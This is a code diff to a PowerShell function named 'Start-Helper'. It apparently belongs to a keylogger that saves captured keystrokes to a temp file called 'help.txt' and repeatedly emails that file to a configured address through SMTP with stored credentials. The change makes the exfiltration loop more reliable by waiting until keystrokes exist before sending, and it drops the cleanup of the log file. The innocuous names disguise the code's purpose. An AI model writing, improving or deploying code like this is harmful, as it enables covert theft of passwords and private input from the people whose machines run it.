@@ -35,17 +35,21 @@ function Start-Helper($Path="$env:temp\help.txt") {
             $TimeNow = Get-Date
         }
 
-        Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
+        if (Test-Path $Path) {
+            Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
 
-        # Reset variables for next iteration
-        $TimeStart = Get-Date
-        $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
-        $TimeNow = Get-Date
-        $TimesToRun--
-        Write-Host "Email sent. Waiting 30 seconds to send next email..."
-        Start-Sleep -Seconds 30
+            # Reset variables for next iteration
+            $TimeStart = Get-Date
+            $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
+            $TimeNow = Get-Date
+            $TimesToRun--
+            Write-Host "Email sent. Waiting 30 seconds to send next email..."
+            Start-Sleep -Seconds 30
+        } else {
+            Write-Host "No keystrokes captured. Waiting for input..."
+            Start-Sleep -Seconds 5
+        }
     }
-    Remove-Item -Path $Path -Force
     exit 1
 }
 
